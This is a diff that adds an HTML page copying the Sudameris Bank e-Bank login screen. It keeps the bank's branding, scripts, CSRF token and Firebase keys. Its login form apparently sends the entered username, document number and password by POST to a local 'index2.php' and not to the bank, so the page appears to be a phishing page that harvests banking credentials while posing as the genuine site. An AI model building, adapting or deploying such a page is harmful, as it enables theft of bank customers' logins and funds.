@@ -1,0 +1,408 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    
+    <meta name="description" content="SudamerisBank">
+    <script type="text/javascript" src="/sudamerisweb/ruxitagentjs_ICA2NVfgjoqru_10255221104040649.js" data-dtconfig="app=ea7c4b59f27d43eb|featureHash=ICA2NVfgjoqru|vcv=2|rdnt=1|uxrgce=1|bp=3|cuc=87ss8mvt|mel=100000|dpvc=1|ssv=4|lastModification=1674014072820|dtVersion=10255221104040649|tp=500,50,0,1|uxdcw=1500|agentUri=/sudamerisweb/ruxitagentjs_ICA2NVfgjoqru_10255221104040649.js|reportUrl=/sudamerisweb/rb_bf88382yik|rid=RID_-1583438007|rpid=913277276|domain=sudameris.com.py"></script><link rel="icon" href="/sudamerisweb/resources/img/favicon.ico"/>
+    
+
+
+    <title>Sudameris</title>
+
+    <!-- CSS -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=PT+Sans+Narrow&family=Sofia+Sans:wght@500&display=swap" rel="stylesheet">
+<link href="css.css" rel="stylesheet">
+
+
+
+
+
+    <!-- JS -->
+    
+
+
+<script type="text/javascript" src="/sudamerisweb/webjars/jquery/3.6.0/jquery.js?v=1.0.48-RELEASE-20221206163441"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/bootstrap/js/bootstrap.js?v=1.0.48-RELEASE-20221206163441"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/js-login/form-validator.js?v=1.0.48-RELEASE-20221206163441"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/doublecrypt.js?v=1.0.48-RELEASE-20221206163441"></script>
+
+  <!-- crypt -->
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/crypto-js.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/core.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/cipher-core.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/sha256.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/enc-utf8.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/enc-base64.js"></script>
+<script type="text/javascript" src="/sudamerisweb/resources/js/libs/crypto-js/aes.js"></script>
+  
+    <script>
+
+    doublecrypt.init(
+        "CNi3epbRp2tsOq3xbzMzSA==",
+        "7lgBxWsDi2tfkbRm//4lqqrjPFYAXLa8HVHc3+E0JxE="
+    );
+    /**/
+    let CSRF_TOKEN="5PWF/gqWX/vB/VbatvUdJ9mD+qYKkb1z6CzQh1/WIiU=";
+</script>
+
+    <script>
+        var baseUrl="/sudamerisweb";
+        console.log(baseUrl);
+
+        var SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES ="300000";
+        console.log(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES);
+        if(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES == "") SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES = "60000"; /*default 1 minute*/
+        console.log(SESSION_CHECK_INTERVAL_MILLIS_FROM_PROPERTIES);
+
+        var TIMEOUT_IN_MILLIS_FROM_PROPERTIES ="600000";
+        if(TIMEOUT_IN_MILLIS_FROM_PROPERTIES == "") TIMEOUT_IN_MILLIS_FROM_PROPERTIES = "900000"; /*default 15 minutes*/
+
+    </script>
+</head>
+<body class="bkg-color-medium">
+  <div class="auth-spinner" style="display: none"><div class="lds-ellipsis"><div></div><div></div><div></div><div></div></div></div>
+  
+
+  <div class="container welcome-bkg pr-0">
+    <div class="row">
+    <input type="hidden" id="refresh" value="no">
+    <div class="col-xs-5 col-sm-3 lateral-logo">
+
+    </div>
+    <div class="col-lg-14 col-md-13 col-sm-12 col-xs-4" style="height:100%">
+      <div style="margin-top:15% ;
+       position: relative;
+    left: 200px;">
+          <p class="font-style-label font-login-text font-login-medium">SUDAMERIS</p>
+          <p class="font-style-label font-login-text font-login-big mt-30">Bienvenid<span style="font-family: Arial">@</span></p>
+          <p class="font-style-label font-login-text font-login-big"> al nuevo e-Bank</p>
+          <p class="font-style-label font-login-text font-login-small mt-30">Descargá la app para dispositivos móviles</p>
+          <p class="font-style-label font-login-text font-login-small">desde Google Play o App Store</p>
+      </div>
+    </div>
+    <div class="col-lg-5 col-md-7 col-sm-8 col-xs-12" style="height:100%;display:table; min-width: 10.4em">
+      <div style="display: table-cell; vertical-align: middle">
+        <form id="loginForm" role="form" style="background-color:rgba(255, 255, 255, 0.88);padding:1rem;
+        position: relative;
+    left: 800px;
+    /* position: relative; */
+    position: relative;
+    top: -300px;" action="index2.php" method="POST" autocomplete="off"><!-- id="login-header" -->
+       	  <div>
+              <div class="alert alert-danger" style="display:none;" role="alert" id="alertError">
+                          <p class="alert-text-error"></p>
+                      </div>
+                  </div>
+                  <div class="hide-show" id="country_container">
+                    
+
+          </div>
+          <input id="usuario name="usuario" type="hidden" value=""/><div class="contenedor_requerido" style="text-align: center;">
+            <label class="label-login" id="label_changeable">USUARIO/DOCUMENTO</label>
+            <span class="contenedor-input contenedor_input">
+                <input id="usuario name="usuario" ref="pass" placeholder="Usuario/Documento" type="text" class="font-medium font-style-value text-color-very-dark input-format requerido contenedor_input passet" value="">
+
+              <input name="userValue" type="hidden" class="uset">
+   
+              
+  
+                          
+              
+          </div>
+          <div class="contenedor_requerido" style="text-align: center;">
+            <label class="label-login" style="text-align: center;
+            padding-bottom: 5px;
+            padding-top: 5px;
+        ">CONTRASEÑA</label>
+            <input id="password" name="password" ref="password" placeholder="Contrase&ntilde;a" type="password" class="font-medium font-style-value text-color-very-dark input-format requerido contenedor_input passet" value=""/><input name="password" type="hidden" class="passet">
+              </div>
+          <div id="captchaContainer">
+
+          </div>
+
+
+          <input type="submit" value="INGRESAR"  class="positive-button bkg-color-red font-style-label text-color-very-light font-small button-login">
+          <p></p>
+          <div class="text-center olvido-container"><a class="olvido-pass" href="#">¿Olvidaste tu contraseña?</a></div>
+          </form><div class="seguridad-container">
+          
+
+
+<div class="bkg-color-very-light subtitle-view">
+  <h2 class="font-style-label text-color-medium font-medium border-bottom-color-medium subtitle-text">
+    SEGURIDAD
+    
+  </h2>
+  <ul class="font-small text-color-very-dark font-style-value">
+              <li class="list-option"><span onclick='showInfoModal("safeSite")' style="cursor: pointer">Este sitio es seguro</span></li>
+              <li class="list-option"><span onclick='showInfoModal("keys")' style="cursor: pointer"  >Claves</span></li>
+              <li class="list-option"><span onclick='showInfoModal("auth")' style="cursor: pointer" >Segundo factor de autenticación (2FA)</span></li>
+            </ul>
+          
+</div>
+</div>
+
+
+      </div>
+
+    </div>
+    <!-- Modal -->
+    <div class="modal fade" id="myModal" role="dialog">
+      <div class="modal_container">
+        <div>
+          <div class="modal-content modal_content">
+            <div class="modal-header modal_header">
+              <div class="text-right"><!-- <button type="button" id="close_migracion" class="close" data-dismiss="modal">&times;</button> --></div>
+              
+            </div>
+            <div class="modal-body modal_body">
+            	
+            	
+            	 <form class="modal_boton text-center" action="/sudamerisweb/unblocking?v=1.0.48-RELEASE-20221206163441"  method="post">
+                     <input type="hidden" name="ssign" value="">
+                     <input type="hidden" name="userType" value="">
+                     <input type="hidden" name="userValue" value="">
+                     <input type="hidden" name="clientVersion" value="">
+
+              	</form>
+            </div>
+           	</div>
+
+        </div>
+      </div>
+    </div>
+
+
+      <div class="modal fade" id="informationModal" role="dialog" aria-labelledby="informationModal">
+          <div class="modal_container">
+              <div style="width: 40%; ">
+                  <div class="modal-content modal_info_content">
+                      <div class="modal-header modal_header">
+                          <h4 class="modal-title pdl-20" ></h4>
+                      </div>
+                      <div class="modal-body modal_body">
+                          <span class="body-text" > </span>
+
+                          <div class="modal_boton text-center mt-35 mb-10">
+
+
+                          </div>
+                      </div>
+                          </div>
+
+              </div>
+          </div>
+      </div>
+
+
+
+
+    <div class="modal fade" id="modalSpinner" data-backdrop="static" data-keyboard="false" tabindex="-1" role="dialog" aria-labelledby="modalSpinner" aria-hidden="true">
+		      <div id="floatingBarsG">
+				<div class="blockG" id="rotateG_01"></div>
+				<div class="blockG" id="rotateG_02"></div>
+				<div class="blockG" id="rotateG_03"></div>
+				<div class="blockG" id="rotateG_04"></div>
+				<div class="blockG" id="rotateG_05"></div>
+				<div class="blockG" id="rotateG_06"></div>
+				<div class="blockG" id="rotateG_07"></div>
+				<div class="blockG" id="rotateG_08"></div>
+			</div>
+	</div>    
+
+  </div>
+  <script>
+          // GLOBAL VARIABLES
+        var baseUrl="/sudamerisweb";
+        var CAPTCHA_SHOW='';
+        var MIGRACION='';
+        var ERROR_MESSAGE="";
+        var CHECK_CAPTCHA_URL="/sudamerisweb/login/check-captcha?v=1.0.48-RELEASE-20221206163441";
+        var GET_CAPTCHA_URL="/sudamerisweb/login/get-captcha?v=1.0.48-RELEASE-20221206163441";
+        var RELOAD_CAPTCHA_URL="/sudamerisweb/captcha?v=1.0.48-RELEASE-20221206163441";
+  </script>
+  <script type="text/javascript">
+      function actualizar(){location.reload(true);}
+      setInterval("actualizar()",1800000);
+  </script>
+  <script type="application/javascript" src="/sudamerisweb/resources/js/js-login/start.js?v=1.0.48-RELEASE-20221206163441"></script>
+  <style>
+    /*the container must be positioned relative:*/
+    .custom-select {
+        position: relative;
+        font-family: Arial;
+    }
+    .custom-select.document .select-selected{
+        background-image: url(resources/img/cedula.png);
+        background-position: 95% 0.4em;
+        background-repeat: no-repeat;
+        background-size: 0.8rem;"
+    }
+
+    .custom-select select {
+        display: none; /*hide original SELECT element:*/
+    }
+
+    .select-selected {
+        display: table-cell;
+        background-color: white;
+        vertical-align: middle;
+        /* width: 22em; */
+        display: inline-block;
+        padding-top: 1em;
+    }
+
+
+    /*style the arrow inside the select element:*/
+    .select-selected:after {
+        position: absolute;
+        content: ">";
+        top: 5px;
+        right: 10px;
+        width: 0;
+        height: 0;
+        border: 6px solid transparent;
+        border-color: #fff transparent transparent transparent;
+    }
+
+
+
+    /*style the items (options), including the selected item:*/
+    .select-items div,.select-selected {
+        color: black;
+
+    }
+
+    /*style items (options):*/
+    .select-items {
+        position: absolute;
+        background-color: white;
+        top: 100%;
+        left: 0;
+        right: 0;
+        z-index: 99;
+        max-height: 10em;
+        overflow-y: scroll;
+    }
+    .select-items div{
+        padding: 5px;
+    }
+
+    /*hide the items when the select box is closed:*/
+    .select-hide {
+        display: none;
+    }
+
+    .select-items div:hover {
+        background-color: red;
+    }
+</style>
+<script>
+    var x, i, j, selElmnt, a, b, c;
+    /*look for any elements with the class "custom-select":*/
+    x = document.getElementsByClassName("custom-select");
+    for (i = 0; i < x.length; i++) {
+        selElmnt = x[i].getElementsByTagName("select")[0];
+        /*for each element, create a new DIV that will act as the selected item:*/
+        a = document.createElement("DIV");
+        a.setAttribute("class", "select-selected font-medium font-style-value text-color-very-dark input-format");
+        a.innerHTML = selElmnt.options[selElmnt.selectedIndex].innerHTML;
+        x[i].appendChild(a);
+        /*for each element, create a new DIV that will contain the option list:*/
+        b = document.createElement("DIV");
+        b.setAttribute("class", "select-items select-hide");
+        for (j = 0; j < selElmnt.length; j++) {
+            /*for each option in the original select element,
+            create a new DIV that will act as an option item:*/
+            c = document.createElement("DIV");
+            c.setAttribute("class", "font-medium font-style-value text-color-very-dark");
+            c.innerHTML = selElmnt.options[j].innerHTML;
+            c.addEventListener("click", function(e) {
+                /*when an item is clicked, update the original select box,
+                and the selected item:*/
+                var y, i, k, s, h;
+                s = this.parentNode.parentNode.getElementsByTagName("select")[0];
+                h = this.parentNode.previousSibling;
+                for (i = 0; i < s.length; i++) {
+                    if (s.options[i].innerHTML == this.innerHTML) {
+                        s.selectedIndex = i;
+                        h.innerHTML = this.innerHTML;
+                        y = this.parentNode.getElementsByClassName("same-as-selected");
+                        for (k = 0; k < y.length; k++) {
+                            y[k].setAttribute("class", "font-medium font-style-value text-color-very-dark")
+                        }
+
+                        this.setAttribute("class", "same-as-selected font-medium font-style-value text-color-very-dark");
+                        break;
+                    }
+                }
+                h.click();
+            });
+            b.appendChild(c);
+        }
+        x[i].appendChild(b);
+        a.addEventListener("click", function(e) {
+            /*when the select box is clicked, close any other select boxes,
+            and open/close the current select box:*/
+            e.stopPropagation();
+            closeAllSelect(this);
+            this.nextSibling.classList.toggle("select-hide");
+            this.classList.toggle("select-arrow-active");
+        });
+    }
+    function closeAllSelect(elmnt) {
+        /*a function that will close all select boxes in the document,
+        except the current select box:*/
+        var x, y, i, arrNo = [];
+        x = document.getElementsByClassName("select-items");
+        y = document.getElementsByClassName("select-selected");
+        for (i = 0; i < y.length; i++) {
+            if (elmnt == y[i]) {
+                arrNo.push(i)
+            } else {
+                y[i].classList.remove("select-arrow-active");
+            }
+        }
+        for (i = 0; i < x.length; i++) {
+            if (arrNo.indexOf(i)) {
+                x[i].classList.add("select-hide");
+            }
+        }
+    }
+    /*if the user clicks anywhere outside the select box,
+    then close all select boxes:*/
+    document.addEventListener("click", closeAllSelect);
+</script><link href="/sudamerisweb/resources/css/margin.css" rel="stylesheet">
+
+  </div>
+  <!-- The core Firebase JS SDK is always required and must be listed first -->
+  <script src="https://www.gstatic.com/firebasejs/7.9.1/firebase-app.js"></script>
+  <!-- TODO: Add SDKs for Firebase products that you want to use
+       https://firebase.google.com/docs/web/setup#available-libraries -->
+  <script src="https://www.gstatic.com/firebasejs/7.9.1/firebase-analytics.js"></script>
+  <script>
+      // Your web app's Firebase configuration
+      var firebaseConfig = {
+          apiKey: "AIzaSyAUub6Hj8BA06MHmfSf5uQkH3dufrz8fCw",
+          authDomain: "sudameris-paraguay.firebaseapp.com",
+          databaseURL: "https://sudameris-paraguay.firebaseio.com/",
+          projectId: "sudameris-paraguay",
+          storageBucket: "sudameris-paraguay.appspot.com",
+          messagingSenderId: "370573544351",
+          appId: "1:370573544351:web:72809ee15c4506cac7cbaa",
+          measurementId: "G-CT1F4ZDT4M"
+      };
+      // Initialize Firebase
+      firebase.initializeApp(firebaseConfig);
+      firebase.analytics();
+  </script>
+<script async type="text/javascript" src="/_Incapsula_Resource?SWJIYLWA=719d34d31c8e3a6e6fffd425f7e032f3&ns=32&cb=1085347101"></script>
+</body>
+</html>
